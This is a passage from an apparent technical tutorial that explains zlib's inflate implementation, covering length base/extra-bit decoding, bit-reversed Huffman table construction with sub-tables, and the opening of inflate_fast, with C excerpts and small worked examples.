            <span>if</span> <span>(</span><span>(</span><span>int</span><span>)</span><span>(</span>here<span>.</span>op<span>)</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>
                <span>Tracevv</span><span>(</span><span>(</span><span>stderr</span><span>,</span> here<span>.</span>val <span>&gt;=</span> <span>0x20</span> <span>&amp;&amp;</span> here<span>.</span>val <span>&lt;</span> <span>0x7f</span> <span>?</span>
                        <span>&#34;inflate:         literal &#39;%c&#39;\n&#34;</span> <span>:</span>
                        <span>&#34;inflate:         literal 0x%02x\n&#34;</span><span>,</span> here<span>.</span>val<span>)</span><span>)</span><span>;</span>
                state<span>-&gt;</span>mode <span>=</span> LIT<span>;</span>
                <span>break</span><span>;</span>
            <span>}</span>
            <span>if</span> <span>(</span>here<span>.</span>op <span>&amp;</span> <span>32</span><span>)</span> <span>{</span>
                <span>Tracevv</span><span>(</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;inflate:         end of block\n&#34;</span><span>)</span><span>)</span><span>;</span>
                state<span>-&gt;</span>back <span>=</span> <span>-</span><span>1</span><span>;</span>
                state<span>-&gt;</span>mode <span>=</span> TYPE<span>;</span>
                <span>break</span><span>;</span>
            <span>}</span>
            <span>if</span> <span>(</span>here<span>.</span>op <span>&amp;</span> <span>64</span><span>)</span> <span>{</span>
                strm<span>-&gt;</span>msg <span>=</span> <span>(</span>z_const <span>char</span> <span>*</span><span>)</span><span>&#34;invalid literal/length code&#34;</span><span>;</span>
                state<span>-&gt;</span>mode <span>=</span> BAD<span>;</span>
                <span>break</span><span>;</span>
            <span>}</span>
            state<span>-&gt;</span>extra <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>here<span>.</span>op<span>)</span> <span>&amp;</span> <span>15</span><span>;</span>
            state<span>-&gt;</span>mode <span>=</span> LENEXT<span>;</span>
                <span>/* fallthrough */</span>
        <span>case</span> LENEXT<span>:</span>
            <span>if</span> <span>(</span>state<span>-&gt;</span>extra<span>)</span> <span>{</span>
                <span>NEEDBITS</span><span>(</span>state<span>-&gt;</span>extra<span>)</span><span>;</span>
                state<span>-&gt;</span>length <span>+=</span> <span>BITS</span><span>(</span>state<span>-&gt;</span>extra<span>)</span><span>;</span>
                <span>DROPBITS</span><span>(</span>state<span>-&gt;</span>extra<span>)</span><span>;</span>
                state<span>-&gt;</span>back <span>+=</span> state<span>-&gt;</span>extra<span>;</span>
            <span>}</span>
            <span>Tracevv</span><span>(</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;inflate:         length %u\n&#34;</span><span>,</span> state<span>-&gt;</span>length<span>)</span><span>)</span><span>;</span>
            state<span>-&gt;</span>was <span>=</span> state<span>-&gt;</span>length<span>;</span>
            state<span>-&gt;</span>mode <span>=</span> DIST<span>;</span>
                <span>/* fallthrough */</span></code></pre>
<p>To understand Base/Extra, look at the length-decoding routine in <code>inflate</code>. First, <code>state-&gt;length = here.val</code> (the base). Then, based on <code>op</code>, if it’s not a literal/end/invalid, we go to length decoding.</p>
<p><code>op &amp; 15</code> extracts the number of extra bits. We then read that many bits and add them to the base to get the final length.</p>
<blockquote>
<p>The <code>op &amp; 15</code> is necessary because the <code>lext</code>/<code>dext</code> arrays encode flags along with the count of extra bits.</p>
</blockquote>
<pre><code>    <span>static</span> <span>const</span> <span>unsigned</span> <span>short</span> lbase<span>[</span><span>31</span><span>]</span> <span>=</span> <span>{</span> <span>/* Length codes 257..285 base */</span>
        <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>,</span> <span>6</span><span>,</span> <span>7</span><span>,</span> <span>8</span><span>,</span> <span>9</span><span>,</span> <span>10</span><span>,</span> <span>11</span><span>,</span> <span>13</span><span>,</span> <span>15</span><span>,</span> <span>17</span><span>,</span> <span>19</span><span>,</span> <span>23</span><span>,</span> <span>27</span><span>,</span> <span>31</span><span>,</span>
        <span>35</span><span>,</span> <span>43</span><span>,</span> <span>51</span><span>,</span> <span>59</span><span>,</span> <span>67</span><span>,</span> <span>83</span><span>,</span> <span>99</span><span>,</span> <span>115</span><span>,</span> <span>131</span><span>,</span> <span>163</span><span>,</span> <span>195</span><span>,</span> <span>227</span><span>,</span> <span>258</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>}</span><span>;</span>
    <span>static</span> <span>const</span> <span>unsigned</span> <span>short</span> lext<span>[</span><span>31</span><span>]</span> <span>=</span> <span>{</span> <span>/* Length codes 257..285 extra */</span>
        <span>16</span><span>,</span> <span>16</span><span>,</span> <span>16</span><span>,</span> <span>16</span><span>,</span> <span>16</span><span>,</span> <span>16</span><span>,</span> <span>16</span><span>,</span> <span>16</span><span>,</span> <span>17</span><span>,</span> <span>17</span><span>,</span> <span>17</span><span>,</span> <span>17</span><span>,</span> <span>18</span><span>,</span> <span>18</span><span>,</span> <span>18</span><span>,</span> <span>18</span><span>,</span>
        <span>19</span><span>,</span> <span>19</span><span>,</span> <span>19</span><span>,</span> <span>19</span><span>,</span> <span>20</span><span>,</span> <span>20</span><span>,</span> <span>20</span><span>,</span> <span>20</span><span>,</span> <span>21</span><span>,</span> <span>21</span><span>,</span> <span>21</span><span>,</span> <span>21</span><span>,</span> <span>16</span><span>,</span> <span>73</span><span>,</span> <span>200</span><span>}</span><span>;</span>
    <span>static</span> <span>const</span> <span>unsigned</span> <span>short</span> dbase<span>[</span><span>32</span><span>]</span> <span>=</span> <span>{</span> <span>/* Distance codes 0..29 base */</span>
        <span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>,</span> <span>7</span><span>,</span> <span>9</span><span>,</span> <span>13</span><span>,</span> <span>17</span><span>,</span> <span>25</span><span>,</span> <span>33</span><span>,</span> <span>49</span><span>,</span> <span>65</span><span>,</span> <span>97</span><span>,</span> <span>129</span><span>,</span> <span>193</span><span>,</span>
        <span>257</span><span>,</span> <span>385</span><span>,</span> <span>513</span><span>,</span> <span>769</span><span>,</span> <span>1025</span><span>,</span> <span>1537</span><span>,</span> <span>2049</span><span>,</span> <span>3073</span><span>,</span> <span>4097</span><span>,</span> <span>6145</span><span>,</span>
        <span>8193</span><span>,</span> <span>12289</span><span>,</span> <span>16385</span><span>,</span> <span>24577</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>}</span><span>;</span>
    <span>static</span> <span>const</span> <span>unsigned</span> <span>short</span> dext<span>[</span><span>32</span><span>]</span> <span>=</span> <span>{</span> <span>/* Distance codes 0..29 extra */</span>
        <span>16</span><span>,</span> <span>16</span><span>,</span> <span>16</span><span>,</span> <span>16</span><span>,</span> <span>17</span><span>,</span> <span>17</span><span>,</span> <span>18</span><span>,</span> <span>18</span><span>,</span> <span>19</span><span>,</span> <span>19</span><span>,</span> <span>20</span><span>,</span> <span>20</span><span>,</span> <span>21</span><span>,</span> <span>21</span><span>,</span> <span>22</span><span>,</span> <span>22</span><span>,</span>
        <span>23</span><span>,</span> <span>23</span><span>,</span> <span>24</span><span>,</span> <span>24</span><span>,</span> <span>25</span><span>,</span> <span>25</span><span>,</span> <span>26</span><span>,</span> <span>26</span><span>,</span> <span>27</span><span>,</span> <span>27</span><span>,</span>
        <span>28</span><span>,</span> <span>28</span><span>,</span> <span>29</span><span>,</span> <span>29</span><span>,</span> <span>64</span><span>,</span> <span>64</span><span>}</span><span>;</span></code></pre>
<p>For example, suppose we want to decode length 20. Its code length entry would be at <code>huffman_table[269]</code>.</p>
<pre><code>here.op = extra - match](257) = extra[12] = lext[12] = 18
here.val = base - match(257)] = base[12] = lbase[12] = 19</code></pre>
<p>The length routine then computes <code>state-&gt;length = 19 + BITS(18 &amp; 15 (2))</code>. If the stream provides <code>01</code> as the extra bits, we decode <code>19 + 1 = 20</code>.</p>
<p>The key idea of Base/Extra: values like 20 (and the range <code>19 + 0b00 ~ 0b11</code>) are all represented by the same Huffman symbol (index 269); the exact value is determined by reading the extra bits. The table groups ranges by base and uses extra bits to resolve within the range.</p>
<pre><code>        <span>/* replicate for those indices with low len bits equal to huff */</span>
        incr <span>=</span> <span>1U</span> <span>&lt;&lt;</span> <span>(</span>len <span>-</span> drop<span>)</span><span>;</span>
        fill <span>=</span> <span>1U</span> <span>&lt;&lt;</span> curr<span>;</span>
        min <span>=</span> fill<span>;</span>                 <span>/* save offset to next table */</span>
        <span>do</span> <span>{</span>
            fill <span>-=</span> incr<span>;</span>
            next<span>[</span><span>(</span>huff <span>&gt;&gt;</span> drop<span>)</span> <span>+</span> fill<span>]</span> <span>=</span> here<span>;</span>
        <span>}</span> <span>while</span> <span>(</span>fill <span>!=</span> <span>0</span><span>)</span><span>;</span>

        <span>/* backwards increment the len-bit code huff */</span>
        incr <span>=</span> <span>1U</span> <span>&lt;&lt;</span> <span>(</span>len <span>-</span> <span>1</span><span>)</span><span>;</span>
        <span>while</span> <span>(</span>huff <span>&amp;</span> incr<span>)</span>
            incr <span>&gt;&gt;=</span> <span>1</span><span>;</span>
        <span>if</span> <span>(</span>incr <span>!=</span> <span>0</span><span>)</span> <span>{</span>
            huff <span>&amp;=</span> incr <span>-</span> <span>1</span><span>;</span>
            huff <span>+=</span> incr<span>;</span>
        <span>}</span>
        <span>else</span>
            huff <span>=</span> <span>0</span><span>;</span>

        <span>/* go to next symbol, update count, len */</span>
        sym<span>++</span><span>;</span>
        <span>if</span> <span>(</span><span>--</span><span>(</span>count<span>[</span>len<span>]</span><span>)</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>
            <span>if</span> <span>(</span>len <span>==</span> max<span>)</span> <span>break</span><span>;</span>
            len <span>=</span> lens<span>[</span>work<span>[</span>sym<span>]</span><span>]</span><span>;</span>
        <span>}</span></code></pre>
<p>After creating a <code>code</code> entry, we write it into the table at multiple positions. <code>drop</code> is used for sub-tables (multi-level); it’s 0 in the primary table.</p>
<p>The loop writes <code>here</code> into <code>next[huff + (0, incr, incr*2, …, fill-incr)]</code>. Before explaining why, let’s note something important:</p>
<pre><code>A -&gt; 00
B -&gt; 01
C -&gt; 10
D -&gt; 110
E -&gt; 111</code></pre>
<p>If we naively stored:</p>
<pre><code>next[0(0b00)] = here(op=0, bits=2, val=&#39;A&#39;)
next[1(0b01)] = here(op=0, bits=2, val=&#39;B&#39;)
next[2(0b10)] = here(op=0, bits=2, val=&#39;C&#39;)
next[6(0b110)] = here(op=0, bits=3, val=&#39;D&#39;)
next[7(0b111)] = here(op=0, bits=3, val=&#39;E&#39;)</code></pre>
<p>that <em>looks</em> reasonable—but it’s wrong.</p>
<p>Consider compressing “CB”:</p>
<pre><code>0b10(C) &lt;&lt; 0 + 0b01(B) &lt;&lt; 2 = 0b0110</code></pre>
<blockquote>
<p>Bits are packed least significant bit first; simply concatenating as <code>0b1001</code> would make bitwise decoding impossible.</p>
</blockquote>
<p>The compressed bits for <code>CB</code> (0b0110) match those for <code>D</code> (0b110). Even though the code set is prefix-free when read left-to-right, Deflate uses a bitstream where the <em>trailing</em> bits act as prefixes due to LSB-first packing. To handle this, we reverse the bit order when building indices:</p>
<pre><code>next[0(0b00)] = here(op=0, bits=2, val=&#39;A&#39;)
next[2(0b10)] = here(op=0, bits=2, val=&#39;B&#39;)
next[1(0b01)] = here(op=0, bits=2, val=&#39;C&#39;)
next[3(0b011)] = here(op=0, bits=3, val=&#39;D&#39;)
next[7(0b111)] = here(op=0, bits=3, val=&#39;E&#39;)</code></pre>
<p>So the correct index order is 0,2,1,3,7 rather than 0,1,2,6,7.</p>
<pre><code>        <span>/* replicate for those indices with low len bits equal to huff */</span>
        incr <span>=</span> <span>1U</span> <span>&lt;&lt;</span> <span>(</span>len <span>-</span> drop<span>)</span><span>;</span>
        fill <span>=</span> <span>1U</span> <span>&lt;&lt;</span> curr<span>;</span>
        min <span>=</span> fill<span>;</span>                 <span>/* save offset to next table */</span>
        <span>do</span> <span>{</span>
            fill <span>-=</span> incr<span>;</span>
            next<span>[</span><span>(</span>huff <span>&gt;&gt;</span> drop<span>)</span> <span>+</span> fill<span>]</span> <span>=</span> here<span>;</span>
        <span>}</span> <span>while</span> <span>(</span>fill <span>!=</span> <span>0</span><span>)</span><span>;</span></code></pre>
<p>Back to the loop. <code>huff</code> holds the (bit-reversed) Huffman code in progress. We don’t just store at <code>next[huff]</code>; we fill out all positions differing only in the unused high bits of the primary table.</p>
<p><code>fill</code> is <code>1 &lt;&lt; curr</code> (table size), and <code>incr</code> is <code>1 &lt;&lt; len</code> (or <code>1 &lt;&lt; (len - drop)</code> for sub-tables). So the effect is:</p>
<blockquote>
<p>If the primary table has <code>curr=root</code> bits, and <code>huff=0b111</code> with code length 3, then fill covers:</p>
</blockquote>
<ul>
<li>0b00111</li>
<li>0b01111</li>
<li>0b10111</li>
<li>0b11111</li>
</ul>
<p>We’re enumerating the higher bits that are irrelevant to this code length. This allows constant-time decoding:</p>
<pre><code>next[0(0b00), 4(0b100)] = here(op=0, bits=2, val=&#39;A&#39;)
next[2(0b10), 6(0b110)] = here(op=0, bits=2, val=&#39;B&#39;)
next[1(0b01), 6(0b101)] = here(op=0, bits=2, val=&#39;C&#39;)
next[3(0b011)] = here(op=0, bits=3, val=&#39;D&#39;)
next[7(0b111)] = here(op=0, bits=3, val=&#39;E&#39;)</code></pre>
<p>When decoding <code>AC</code> (0b0100), we can immediately index <code>next[0b100]</code> with <code>BITS(root)</code> and decode ‘A’ without checking code lengths; then drop 2 bits and continue.</p>
<p>Back to the actual decoding:</p>
<pre><code>here <span>=</span> state<span>-&gt;</span>lencode<span>[</span><span>BITS</span><span>(</span>state<span>-&gt;</span>lenbits<span>)</span><span>]</span><span>;</span></code></pre>
<p>This implements the same idea: index with fixed <code>lenbits</code> and decode immediately. The <code>while</code> loop plus <code>fill/incr</code> achieve this optimization.</p>
<pre><code>        <span>/* backwards increment the len-bit code huff */</span>
        incr <span>=</span> <span>1U</span> <span>&lt;&lt;</span> <span>(</span>len <span>-</span> <span>1</span><span>)</span><span>;</span>
        <span>while</span> <span>(</span>huff <span>&amp;</span> incr<span>)</span>
            incr <span>&gt;&gt;=</span> <span>1</span><span>;</span>
        <span>if</span> <span>(</span>incr <span>!=</span> <span>0</span><span>)</span> <span>{</span>
            huff <span>&amp;=</span> incr <span>-</span> <span>1</span><span>;</span>
            huff <span>+=</span> incr<span>;</span>
        <span>}</span>
        <span>else</span>
            huff <span>=</span> <span>0</span><span>;</span></code></pre>
<p>This updates <code>huff</code> in bit-reversed order:</p>
<pre><code>00,01,10,110,111 -&gt; X
00,10,01,011,111 -&gt; O</code></pre>
<p>i.e., increment with bit-reversed semantics.</p>
<pre><code>        <span>/* go to next symbol, update count, len */</span>
        sym<span>++</span><span>;</span>
        <span>if</span> <span>(</span><span>--</span><span>(</span>count<span>[</span>len<span>]</span><span>)</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>
            <span>if</span> <span>(</span>len <span>==</span> max<span>)</span> <span>break</span><span>;</span>
            len <span>=</span> lens<span>[</span>work<span>[</span>sym<span>]</span><span>]</span><span>;</span>
        <span>}</span></code></pre>
<p>Move to the next symbol and update the working code length.</p>
<pre><code>        <span>/* create new sub-table if needed */</span>
        <span>if</span> <span>(</span>len <span>&gt;</span> root <span>&amp;&amp;</span> <span>(</span>huff <span>&amp;</span> mask<span>)</span> <span>!=</span> low<span>)</span> <span>{</span>
            <span>/* if first time, transition to sub-tables */</span>
            <span>if</span> <span>(</span>drop <span>==</span> <span>0</span><span>)</span>
                drop <span>=</span> root<span>;</span>

            <span>/* increment past last table */</span>
            next <span>+=</span> min<span>;</span>            <span>/* here min is 1 &lt;&lt; curr */</span>

            <span>/* determine length of next table */</span>
            curr <span>=</span> len <span>-</span> drop<span>;</span>
            left <span>=</span> <span>(</span><span>int</span><span>)</span><span>(</span><span>1</span> <span>&lt;&lt;</span> curr<span>)</span><span>;</span>
            <span>while</span> <span>(</span>curr <span>+</span> drop <span>&lt;</span> max<span>)</span> <span>{</span>
                left <span>-=</span> count<span>[</span>curr <span>+</span> drop<span>]</span><span>;</span>
                <span>if</span> <span>(</span>left <span>&lt;=</span> <span>0</span><span>)</span> <span>break</span><span>;</span>
                curr<span>++</span><span>;</span>
                left <span>&lt;&lt;=</span> <span>1</span><span>;</span>
            <span>}</span>

            <span>/* check for enough space */</span>
            used <span>+=</span> <span>1U</span> <span>&lt;&lt;</span> curr<span>;</span>

            <span>/* point entry in root table to sub-table */</span>
            low <span>=</span> huff <span>&amp;</span> mask<span>;</span>
            <span>(</span><span>*</span>table<span>)</span><span>[</span>low<span>]</span><span>.</span>op <span>=</span> <span>(</span><span>unsigned</span> <span>char</span><span>)</span>curr<span>;</span>
            <span>(</span><span>*</span>table<span>)</span><span>[</span>low<span>]</span><span>.</span>bits <span>=</span> <span>(</span><span>unsigned</span> <span>char</span><span>)</span>root<span>;</span>
            <span>(</span><span>*</span>table<span>)</span><span>[</span>low<span>]</span><span>.</span>val <span>=</span> <span>(</span><span>unsigned</span> <span>short</span><span>)</span><span>(</span>next <span>-</span> <span>*</span>table<span>)</span><span>;</span>
        <span>}</span>
    <span>}</span></code></pre>
<p>This creates a sub-table when <code>len &gt; root</code>.</p>
<p>Let’s illustrate with the earlier example:</p>
<pre><code>next[0(0b00), 4(0b100)] = here(op=0, bits=2, val=&#39;A&#39;)
next[2(0b10), 6(0b110)] = here(op=0, bits=2, val=&#39;B&#39;)
next[1(0b01), 5(0b101)] = here(op=0, bits=2, val=&#39;C&#39;)
next[3(0b011)] = here(op=0, bits=3, val=&#39;D&#39;)
next[7(0b111)] = here(op=0, bits=3, val=&#39;E&#39;)</code></pre>
<p>Assume <code>root=2</code> (for illustration), so 3‑bit codes require a sub-table.</p>
<blockquote>
<p>Due to default <code>state-&gt;lenbits</code>, you wouldn’t actually see <code>root=2</code> with multi-level tables in practice; we’re using small numbers for clarity.</p>
</blockquote>
<pre><code>next[0(0b00)] = here(op=0, bits=2, val=&#39;A&#39;)
next[2(0b10)] = here(op=0, bits=2, val=&#39;B&#39;)
next[1(0b01)] = here(op=0, bits=2, val=&#39;C&#39;)</code></pre>
<p>Codes of length ≤2 fit in the primary table.</p>
<pre><code>            <span>if</span> <span>(</span>drop <span>==</span> <span>0</span><span>)</span>
                drop <span>=</span> root<span>;</span>

            <span>/* increment past last table */</span>
            next <span>+=</span> min<span>;</span>            <span>/* here min is 1 &lt;&lt; curr */</span></code></pre>
<p>We set <code>drop</code> (the number of lower bits to ignore when indexing sub-tables) and advance <code>next</code> to the end of the current table—this is where the sub-table will live.</p>
<p>Now the sub-table is ready: <code>next</code> points to it, and <code>drop=root</code> causes future <code>huff</code> indices to ignore the lower <code>root</code> bits.</p>
<p>On subsequent iterations, entries for the longer codes are placed into the sub-table:</p>
<pre><code>next += 1 &lt;&lt; curr
next[0(0b011 &gt;&gt; 2)] = here(op=0, bits=1 (3-2), val=&#39;D&#39;)
next[1(0b111 &gt;&gt; 2)] = here(op=0, bits=1 (3-2), val=&#39;E&#39;)</code></pre>
<p>Note <code>here.bits = len - drop</code>, so the sub-table stores only the remaining bits.</p>
<pre><code>            <span>/* point entry in root table to sub-table */</span>
            low <span>=</span> huff <span>&amp;</span> mask<span>;</span>
            <span>(</span><span>*</span>table<span>)</span><span>[</span>low<span>]</span><span>.</span>op <span>=</span> <span>(</span><span>unsigned</span> <span>char</span><span>)</span>curr<span>;</span>
            <span>(</span><span>*</span>table<span>)</span><span>[</span>low<span>]</span><span>.</span>bits <span>=</span> <span>(</span><span>unsigned</span> <span>char</span><span>)</span>root<span>;</span>
            <span>(</span><span>*</span>table<span>)</span><span>[</span>low<span>]</span><span>.</span>val <span>=</span> <span>(</span><span>unsigned</span> <span>short</span><span>)</span><span>(</span>next <span>-</span> <span>*</span>table<span>)</span><span>;</span></code></pre>
<p>We also write into the primary table an entry that points to the sub-table. The final multi-level table looks like:</p>
<pre><code>next<span>[</span><span>0</span><span>(</span><span>0</span>b00<span>)</span><span>]</span> <span>=</span> <span>here</span><span>(</span>op<span>=</span><span>0</span><span>,</span> bits<span>=</span><span>2</span><span>,</span> val<span>=</span><span>&#39;A&#39;</span><span>)</span>
next<span>[</span><span>2</span><span>(</span><span>0</span>b10<span>)</span><span>]</span> <span>=</span> <span>here</span><span>(</span>op<span>=</span><span>0</span><span>,</span> bits<span>=</span><span>2</span><span>,</span> val<span>=</span><span>&#39;B&#39;</span><span>)</span>
next<span>[</span><span>1</span><span>(</span><span>0</span>b01<span>)</span><span>]</span> <span>=</span> <span>here</span><span>(</span>op<span>=</span><span>0</span><span>,</span> bits<span>=</span><span>2</span><span>,</span> val<span>=</span><span>&#39;C&#39;</span><span>)</span>

next<span>[</span><span>3</span><span>(</span><span>0</span>b011 <span>&amp;</span> <span>mask</span><span>(</span> <span>(</span><span>1</span> <span>&lt;&lt;</span> <span>2</span><span>)</span> <span>-</span> <span>1</span><span>)</span> <span>)</span><span>]</span> <span>=</span> <span>here</span><span>(</span>op<span>=</span><span>2</span><span>,</span> bits<span>=</span><span>2</span><span>,</span> val<span>=</span><span>4</span><span>)</span>

next <span>+=</span> <span>1</span> <span>&lt;&lt;</span> curr
next<span>[</span><span>0</span><span>(</span><span>0</span>b011 <span>&gt;&gt;</span> <span>2</span><span>)</span><span>]</span> <span>=</span> <span>here</span><span>(</span>op<span>=</span><span>0</span><span>,</span> bits<span>=</span><span>1</span> <span>(</span><span>3</span><span>-</span><span>2</span><span>)</span><span>,</span> val<span>=</span><span>&#39;D&#39;</span><span>)</span>
next<span>[</span><span>1</span><span>(</span><span>0</span>b111 <span>&gt;&gt;</span> <span>2</span><span>)</span><span>]</span> <span>=</span> <span>here</span><span>(</span>op<span>=</span><span>0</span><span>,</span> bits<span>=</span><span>1</span> <span>(</span><span>3</span><span>-</span><span>2</span><span>)</span><span>,</span> val<span>=</span><span>&#39;E&#39;</span><span>)</span></code></pre>
<p>Decoding a 3‑bit code like ‘E’ works like this: first-level lookup at <code>0b011 &amp; mask = 0b11</code> yields <code>here(op=2, bits=2, val=4)</code>, so we consume 2 bits and jump to the sub-table (<code>next += 4</code>). Then we use the next bit (1) to index the sub-table, yielding <code>here(op=0, bits=1, val=&#39;E&#39;)</code>; we consume 1 bit and emit ‘E’.</p>
<pre><code>    <span>/* fill in remaining table entry if code is incomplete (guaranteed to have
       at most one remaining entry, since if the code is incomplete, the
       maximum code length that was allowed to get this far is one bit) */</span>
    <span>if</span> <span>(</span>huff <span>!=</span> <span>0</span><span>)</span> <span>{</span>
        here<span>.</span>op <span>=</span> <span>(</span><span>unsigned</span> <span>char</span><span>)</span><span>64</span><span>;</span>            <span>/* invalid code marker */</span>
        here<span>.</span>bits <span>=</span> <span>(</span><span>unsigned</span> <span>char</span><span>)</span><span>(</span>len <span>-</span> drop<span>)</span><span>;</span>
        here<span>.</span>val <span>=</span> <span>(</span><span>unsigned</span> <span>short</span><span>)</span><span>0</span><span>;</span>
        next<span>[</span>huff<span>]</span> <span>=</span> here<span>;</span>
    <span>}</span>

    <span>/* set return parameters */</span>
    <span>*</span>table <span>+=</span> used<span>;</span>
    <span>*</span>bits <span>=</span> root<span>;</span>
    <span>return</span> <span>0</span><span>;</span></code></pre>
<p>Finally, if the code set is incomplete, the remaining entry is filled with an invalid code marker, then <code>bits</code> is updated and the function returns.</p>
<h2 id="3-3-decode">3-3. Decode</h2>
<pre><code><span>void</span> ZLIB_INTERNAL <span>inflate_fast</span><span>(</span>z_streamp strm<span>,</span> <span>unsigned</span> start<span>)</span> <span>{</span>
    <span>struct</span> <span>inflate_state</span> FAR <span>*</span>state<span>;</span>
    z_const <span>unsigned</span> <span>char</span> FAR <span>*</span>in<span>;</span>      <span>/* local strm-&gt;next_in */</span>
    z_const <span>unsigned</span> <span>char</span> FAR <span>*</span>last<span>;</span>    <span>/* have enough input while in &lt; last */</span>
    <span>unsigned</span> <span>char</span> FAR <span>*</span>out<span>;</span>     <span>/* local strm-&gt;next_out */</span>
    <span>unsigned</span> <span>char</span> FAR <span>*</span>beg<span>;</span>     <span>/* inflate()&#39;s initial strm-&gt;next_out */</span>
    <span>unsigned</span> <span>char</span> FAR <span>*</span>end<span>;</span>     <span>/* while out &lt; end, enough space available */</span>
<span>#<span>ifdef</span> INFLATE_STRICT</span>
    <span>unsigned</span> dmax<span>;</span>              <span>/* maximum distance from zlib header */</span>
<span>#<span>endif</span></span>
    <span>unsigned</span> wsize<span>;</span>             <span>/* window size or zero if not using window */</span>
    <span>unsigned</span> whave<span>;</span>             <span>/* valid bytes in the window */</span>
    <span>unsigned</span> wnext<span>;</span>             <span>/* window write index */</span>
    <span>unsigned</span> <span>char</span> FAR <span>*</span>window<span>;</span>  <span>/* allocated sliding window, if wsize != 0 */</span>
    <span>unsigned</span> <span>long</span> hold<span>;</span>         <span>/* local strm-&gt;hold */</span>
    <span>unsigned</span> bits<span>;</span>              <span>/* local strm-&gt;bits */</span>
    code <span>const</span> FAR <span>*</span>lcode<span>;</span>      <span>/* local strm-&gt;lencode */</span>
    code <span>const</span> FAR <span>*</span>dcode<span>;</span>      <span>/* local strm-&gt;distcode */</span>
    <span>unsigned</span> lmask<span>;</span>             <span>/* mask for first level of length codes */</span>
    <span>unsigned</span> dmask<span>;</span>             <span>/* mask for first level of distance codes */</span>
    code <span>const</span> <span>*</span>here<span>;</span>           <span>/* retrieved table entry */</span>
    <span>unsigned</span> op<span>;</span>                <span>/* code bits, operation, extra bits, or */</span>
                                <span>/*  window position, window bytes to copy */</span>
    <span>unsigned</span> len<span>;</span>               <span>/* match length, unused bytes */</span>
    <span>unsigned</span> dist<span>;</span>              <span>/* match distance */</span>
    <span>unsigned</span> <span>char</span> FAR <span>*</span>from<span>;</span>    <span>/* where to copy match from */</span>

    <span>/* copy state to local variables */</span>
    state <span>=</span> <span>(</span><span>struct</span> <span>inflate_state</span> FAR <span>*</span><span>)</span>strm<span>-&gt;</span>state<span>;</span>
    in <span>=</span> strm<span>-&gt;</span>next_in<span>;</span>
    last <span>=</span> in <span>+</span> <span>(</span>strm<span>-&gt;</span>avail_in <span>-</span> <span>5</span><span>)</span><span>;</span>
    out <span>=</span> strm<span>-&gt;</span>next_out<span>;</span>
    beg <span>=</span> out <span>-</span> <span>(</span>start <span>-</span> strm<span>-&gt;</span>avail_out<span>)</span><span>;</span>
    end <span>=</span> out <span>+</span> <span>(</span>strm<span>-&gt;</span>avail_out <span>-</span> <span>257</span><span>)</span><span>;</span>
<span>#<span>ifdef</span> INFLATE_STRICT</span>
    dmax <span>=</span> state<span>-&gt;</span>dmax<span>;</span>
<span>#<span>endif</span></span>
    wsize <span>=</span> state<span>-&gt;</span>wsize<span>;</span>
    whave <span>=</span> state<span>-&gt;</span>whave<span>;</span>
    wnext <span>=</span> state<span>-&gt;</span>wnext<span>;</span>
    window <span>=</span> state<span>-&gt;</span>window<span>;</span>
    hold <span>=</span> state<span>-&gt;</span>hold<span>;</span>
    bits <span>=</span> state<span>-&gt;</span>bits<span>;</span>
    lcode <span>=</span> state<span>-&gt;</span>lencode<span>;</span>
    dcode <span>=</span> state<span>-&gt;</span>distcode<span>;</span>
    lmask <span>=</span> <span>(</span><span>1U</span> <span>&lt;&lt;</span> state<span>-&gt;</span>lenbits<span>)</span> <span>-</span> <span>1</span><span>;</span>
    dmask <span>=</span> <span>(</span><span>1U</span> <span>&lt;&lt;</span> state<span>-&gt;</span>distbits<span>)</span> <span>-</span> <span>1</span><span>;</span></code></pre>
<p>Time to analyze <code>inflate_fast</code>.</p>
<pre><code>    <span>do</span> <span>{</span>
        <span>if</span> <span>(</span>bits <span>&lt;</span> <span>15</span><span>)</span> <span>{</span>
            hold <span>+=</span> <span>(</span><span>unsigned</span> <span>long</span><span>)</span><span>(</span><span>*</span>in<span>++</span><span>)</span> <span>&lt;&lt;</span> bits<span>;</span>
            bits <span>+=</span> <span>8</span><span>;</span>
            hold <span>+=</span> <span>(</span><span>unsigned</span> <span>long</span><span>)</span><span>(</span><span>*</span>in<span>++</span><span>)</span> <span>&lt;&lt;</span> bits<span>;</span>
            bits <span>+=</span> <span>8</span><span>;</span>
        <span>}</span>
<span>.</span><span>.</span><span>.</span><span>.</span><span>.</span>
<span>.</span><span>.</span><span>.</span><span>.</span><span>.</span>
<span>.</span><span>.</span><span>.</span><span>.</span><span>.</span>
    <span>}</span> <span>while</span> <span>(</span>in <span>&lt;</span> last <span>&amp;&amp;</span> out <span>&lt;</span> end<span>)</span><span>;</span></code></pre>
<p>It loops until the preconditions fail. At the start of each iteration, if fewer than 15 bits are available in <code>hold</code>, it preloads 16 bits. This reduces overhead in the inner loop.</p>
<pre><code>        here <span>=</span> lcode <span>+</span> <span>(</span>hold <span>&amp;</span> lmask<span>)</span><span>;</span>
      dolen<span>:</span>
        op <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>here<span>-&gt;</span>bits<span>)</span><span>;</span>
        hold <span>&gt;&gt;=</span> op<span>;</span>
        bits <span>-=</span> op<span>;</span>
        op <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>here<span>-&gt;</span>op<span>)</span><span>;</span>
        <span>if</span> <span>(</span>op <span>==</span> <span>0</span><span>)</span> <span>{</span>                          <span>/* literal */</span>
            <span>Tracevv</span><span>(</span><span>(</span><span>stderr</span><span>,</span> here<span>-&gt;</span>val <span>&gt;=</span> <span>0x20</span> <span>&amp;&amp;</span> here<span>-&gt;</span>val <span>&lt;</span> <span>0x7f</span> <span>?</span>
                    <span>&#34;inflate:         literal &#39;%c&#39;\n&#34;</span> <span>:</span>
                    <span>&#34;inflate:         literal 0x%02x\n&#34;</span><span>,</span> here<span>-&gt;</span>val<span>)</span><span>)</span><span>;</span>
            <span>*</span>out<span>++</span> <span>=</span> <span>(</span><span>unsigned</span> <span>char</span><span>)</span><span>(</span>here<span>-&gt;</span>val<span>)</span><span>;</span>
